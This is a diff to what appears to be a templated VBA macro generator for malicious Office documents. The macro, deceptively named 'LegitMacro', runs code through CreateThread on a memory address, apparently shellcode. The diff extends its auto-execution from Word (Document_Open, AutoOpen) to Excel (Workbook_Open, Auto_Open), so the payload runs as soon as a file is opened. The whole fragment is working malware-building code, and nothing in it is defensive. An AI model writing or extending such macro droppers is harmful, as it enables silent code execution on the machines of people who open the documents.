@@ -60,6 +60,7 @@ Sub LegitMacro()
     res = CreateThread(0, 0, addr, 0, 0, 0)
 End Sub
 
+{% if office_app == "word" %}
 Sub Document_Open()
     LegitMacro
 End Sub
@@ -67,3 +68,12 @@ End Sub
 Sub AutoOpen()
     LegitMacro
 End Sub
+{% elif office_app == "excel" %}
+Sub Workbook_Open()
+    LegitMacro
+End Sub
+
+Sub Auto_Open()
+    LegitMacro
+End Sub
+{% endif %}
